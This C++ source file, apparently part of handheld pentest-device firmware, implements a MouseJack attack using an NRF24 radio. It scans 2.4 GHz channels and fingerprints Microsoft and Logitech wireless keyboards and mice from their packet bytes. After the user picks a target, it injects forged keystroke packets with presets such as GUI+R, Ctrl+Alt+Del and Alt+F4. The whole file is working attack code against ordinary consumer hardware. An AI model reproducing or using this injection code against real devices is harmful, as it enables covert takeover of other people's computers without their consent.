#include "nrf_mousejack.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <globals.h>

#define MJ_MAX_DEVICES 16
#define MJ_PAYLOAD_SIZE 32
#define MJ_SCAN_DWELL_US 256
#define MJ_CHANNELS 80

struct MjDevice {
    uint8_t addr[5];
    uint8_t addrLen;
    uint8_t channel;
    uint8_t type;
    int8_t lastRssi;
    unsigned long lastSeen;
};

enum MjDevType {
    MJ_TYPE_UNKNOWN = 0,
    MJ_TYPE_MS_KEYBOARD,
    MJ_TYPE_MS_MOUSE,
    MJ_TYPE_LOGI_UNIFYING,
    MJ_TYPE_LOGI_LIGHTSPEED,
    MJ_TYPE_GENERIC_HID
};

static MjDevice mjDevices[MJ_MAX_DEVICES];
static int mjDevCount = 0;

static const char* mjTypeName(uint8_t t) {
    switch (t) {
        case MJ_TYPE_MS_KEYBOARD:    return "MS KB";
        case MJ_TYPE_MS_MOUSE:       return "MS Mouse";
        case MJ_TYPE_LOGI_UNIFYING:  return "Logi Unify";
        case MJ_TYPE_LOGI_LIGHTSPEED:return "Logi LS";
        case MJ_TYPE_GENERIC_HID:    return "HID";
        default:                     return "Unknown";
    }
}

static uint8_t mjDetectType(uint8_t *payload, uint8_t len) {
    if (len < 10) return MJ_TYPE_UNKNOWN;

    if ((payload[0] == 0x08 || payload[0] == 0x0C) &&
        payload[1] == 0x90)
        return MJ_TYPE_MS_KEYBOARD;

    if ((payload[0] == 0x08 || payload[0] == 0x0C) &&
        (payload[1] == 0x90 || payload[1] == 0x50))
        return MJ_TYPE_MS_MOUSE;

    if (payload[0] == 0x00 && payload[1] == 0x4F)
        return MJ_TYPE_LOGI_UNIFYING;
    if (payload[0] == 0x00 && payload[1] == 0xC2)
        return MJ_TYPE_LOGI_UNIFYING;
    if (payload[0] == 0x00 && payload[1] == 0xD3)
        return MJ_TYPE_LOGI_LIGHTSPEED;

    for (int i = 0; i < 5 && i < len; i++) {
        if (payload[i] != 0x00 && payload[i] != 0xFF)
            return MJ_TYPE_GENERIC_HID;
    }

    return MJ_TYPE_UNKNOWN;
}

static int mjFindDevice(uint8_t *addr, uint8_t addrLen, uint8_t ch) {
    for (int i = 0; i < mjDevCount; i++) {
        if (mjDevices[i].addrLen == addrLen &&
            mjDevices[i].channel == ch &&
            memcmp(mjDevices[i].addr, addr, addrLen) == 0)
            return i;
    }
    return -1;
}

static bool mjAddDevice(uint8_t *addr, uint8_t addrLen, uint8_t ch, uint8_t type) {
    int idx = mjFindDevice(addr, addrLen, ch);
    if (idx >= 0) {
        mjDevices[idx].lastSeen = millis();
        if (type != MJ_TYPE_UNKNOWN) mjDevices[idx].type = type;
        return false;
    }
    if (mjDevCount >= MJ_MAX_DEVICES) return false;

    memcpy(mjDevices[mjDevCount].addr, addr, addrLen);
    mjDevices[mjDevCount].addrLen = addrLen;
    mjDevices[mjDevCount].channel = ch;
    mjDevices[mjDevCount].type = type;
    mjDevices[mjDevCount].lastSeen = millis();
    mjDevCount++;
    return true;
}

static void mjBuildLogiPayload(uint8_t *buf, uint8_t hidKey, uint8_t mod) {
    memset(buf, 0, 10);
    buf[0] = 0x00;
    buf[1] = 0xC1;
    buf[2] = mod;
    buf[3] = 0x00;
    buf[4] = hidKey;
    buf[5] = 0x00;
    buf[6] = 0x00;
    buf[7] = 0x00;
    buf[8] = 0x00;
    buf[9] = 0x00;
}

static void mjBuildMsPayload(uint8_t *buf, uint8_t hidKey, uint8_t mod) {
    memset(buf, 0, MJ_PAYLOAD_SIZE);
    buf[0] = 0x08;
    buf[1] = 0x90;
    buf[2] = 0x02;
    buf[3] = 0x02;
    buf[4] = mod;
    buf[5] = 0x00;
    buf[6] = hidKey;
    buf[7] = 0x00;
}

struct MjKeystroke {
    const char *label;
    uint8_t hidKey;
    uint8_t mod;
};

static const MjKeystroke mjPresets[] = {
    {"Hello World",    0x0B, 0x00},
    {"GUI+R (Run)",    0x15, 0x08},
    {"Enter",          0x28, 0x00},
    {"GUI (WinKey)",   0x00, 0x08},
    {"Ctrl+Alt+Del",   0x4C, 0x05},
    {"CapsLock",       0x39, 0x00},
    {"Alt+F4",         0x3D, 0x04},
    {"Tab",            0x2B, 0x00},
    {"Escape",         0x29, 0x00},
    {"PrintScreen",    0x46, 0x00},
};
#define MJ_PRESET_COUNT (sizeof(mjPresets)/sizeof(mjPresets[0]))

void nrf_mousejack() {
    if (!nrf_start(NRF_MODE_SPI)) {
        displayError("NRF24 not found");
        delay(500);
        return;
    }

    mjDevCount = 0;
    memset(mjDevices, 0, sizeof(mjDevices));

    NRFradio.setAutoAck(false);
    NRFradio.disableCRC();
    NRFradio.setAddressWidth(5);
    NRFradio.setPALevel(RF24_PA_MAX);
    NRFradio.setDataRate(RF24_2MBPS);
    NRFradio.setPayloadSize(MJ_PAYLOAD_SIZE);

    const uint8_t promAddr[5] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};
    NRFradio.openReadingPipe(0, promAddr);

    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FM);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawCentreString("MouseJack", tftWidth / 2, 5, 1);
    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(5, 28);
    tft.println("Scanning 2.4GHz...");
    tft.drawRoundRect(2, 2, tftWidth - 4, tftHeight - 4, 5, bruceConfig.priColor);

    for (int pass = 0; pass < 12; pass++) {
        for (int ch = 0; ch < MJ_CHANNELS; ch++) {
            NRFradio.setChannel(ch);
            NRFradio.startListening();
            delayMicroseconds(MJ_SCAN_DWELL_US);
            NRFradio.stopListening();

            if (NRFradio.available()) {
                uint8_t payload[MJ_PAYLOAD_SIZE];
                NRFradio.read(payload, MJ_PAYLOAD_SIZE);

                uint8_t type = mjDetectType(payload, MJ_PAYLOAD_SIZE);
                if (type != MJ_TYPE_UNKNOWN) {
                    uint8_t addr[5];
                    for (int i = 0; i < 5; i++) addr[i] = payload[i];
                    mjAddDevice(addr, 5, ch, type);
                }
            }
        }

        tft.fillRect(5, 40, tftWidth - 10, FP * LH, bruceConfig.bgColor);
        tft.setCursor(5, 40);
        tft.printf("Pass %d/12 | Found: %d", pass + 1, mjDevCount);

        if (check(EscPress)) {
            NRFradio.stopListening();
            return;
        }
    }

    if (mjDevCount == 0) {
        displayError("No devices found");
        delay(1000);
        return;
    }

    int selDev = 0;
    options.clear();
    for (int i = 0; i < mjDevCount; i++) {
        char label[40];
        snprintf(label, sizeof(label), "CH%d %s %02X%02X",
                 mjDevices[i].channel,
                 mjTypeName(mjDevices[i].type),
                 mjDevices[i].addr[0], mjDevices[i].addr[1]);
        int idx = i;
        options.push_back({String(label), [&selDev, idx]() { selDev = idx; }});
    }
    options.push_back({"Back", [&]() { selDev = -1; }});
    loopOptions(options);

    if (selDev < 0 || selDev >= mjDevCount) return;

    MjDevice &target = mjDevices[selDev];

    int selPreset = 0;
    options.clear();
    for (int i = 0; i < (int)MJ_PRESET_COUNT; i++) {
        int idx = i;
        options.push_back({String(mjPresets[i].label), [&selPreset, idx]() { selPreset = idx; }});
    }
    options.push_back({"Back", [&selPreset]() { selPreset = -1; }});
    loopOptions(options);

    if (selPreset < 0) return;

    uint8_t txPayload[MJ_PAYLOAD_SIZE];
    if (target.type == MJ_TYPE_MS_KEYBOARD || target.type == MJ_TYPE_MS_MOUSE)
        mjBuildMsPayload(txPayload, mjPresets[selPreset].hidKey, mjPresets[selPreset].mod);
    else
        mjBuildLogiPayload(txPayload, mjPresets[selPreset].hidKey, mjPresets[selPreset].mod);

    NRFradio.stopListening();
    NRFradio.setChannel(target.channel);
    NRFradio.setAutoAck(false);
    NRFradio.openWritingPipe(target.addr);
    NRFradio.setPayloadSize(MJ_PAYLOAD_SIZE);

    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FM);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawCentreString("MouseJack TX", tftWidth / 2, 5, 1);

    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(5, 30);
    tft.printf("Target: %s CH%d", mjTypeName(target.type), target.channel);
    tft.setCursor(5, 44);
    tft.printf("Addr: %02X:%02X:%02X:%02X:%02X",
               target.addr[0], target.addr[1], target.addr[2],
               target.addr[3], target.addr[4]);
    tft.setCursor(5, 58);
    tft.printf("Key: %s", mjPresets[selPreset].label);

    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.setCursor(5, 80);
    tft.println("SEL=Inject ESC=Exit");
    tft.drawRoundRect(2, 2, tftWidth - 4, tftHeight - 4, 5, bruceConfig.priColor);

    int txCount = 0;
    bool redraw = false;

    while (!check(EscPress)) {
        if (check(SelPress)) {
            for (int burst = 0; burst < 5; burst++) {
                NRFradio.write(txPayload, MJ_PAYLOAD_SIZE);
                delayMicroseconds(500);
            }

            uint8_t releasePayload[MJ_PAYLOAD_SIZE];
            if (target.type == MJ_TYPE_MS_KEYBOARD || target.type == MJ_TYPE_MS_MOUSE)
                mjBuildMsPayload(releasePayload, 0x00, 0x00);
            else
                mjBuildLogiPayload(releasePayload, 0x00, 0x00);

            delay(10);
            for (int burst = 0; burst < 3; burst++) {
                NRFradio.write(releasePayload, MJ_PAYLOAD_SIZE);
                delayMicroseconds(500);
            }

            txCount++;
            redraw = true;
        }

        if (redraw) {
            tft.fillRect(5, 96, tftWidth - 10, FP * LH, bruceConfig.bgColor);
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setCursor(5, 96);
            tft.printf("Injected x%d", txCount);
            redraw = false;
        }

        delay(10);
    }
}
